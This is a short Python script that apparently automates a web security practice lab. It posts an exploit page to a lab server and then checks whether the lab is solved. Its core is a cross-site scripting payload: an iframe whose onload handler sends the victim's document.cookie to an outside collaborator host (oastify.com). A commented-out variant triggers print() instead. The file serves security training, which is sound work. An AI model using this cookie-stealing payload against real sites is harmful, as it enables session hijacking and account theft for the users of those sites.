import sys
import logging
import argparse
import urllib3

import requests

from utils import utils   # script written by @tjc_  https://youtu.be/E6wN2zBpdKk
from utils.blog import Blog


log = logging.getLogger(__name__)
logging.basicConfig(
    stream=sys.stdout,
    level=logging.INFO,
    format="{asctime} [{threadName}][{levelname}][{name}] {message}",
    style="{",
    datefmt="%H:%M:%S",
)
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


def main(args):
    blog = Blog(args.url, args.no_proxy)
    # escape single quotes  \'
    # payload = f'<iframe src="{blog.base_url}#" onload="this.src+=\'<img src=x onerror=print()>\'"></iframe>'
    payload = f'<iframe src="{blog.base_url}#" onload="document.location=\'http://v730b4jdo97yshoqrcwf0vfcs3yumka9.oastify.com/?pythons=\'+document.cookie"></iframe>'
    blog.post_exploit(response_body=payload)
    blog.is_solved()


if __name__ == "__main__":          # credit for this code go to @tjc_  \o/  u r a legend !
    args = utils.parse_args(sys.argv)
    main(args)
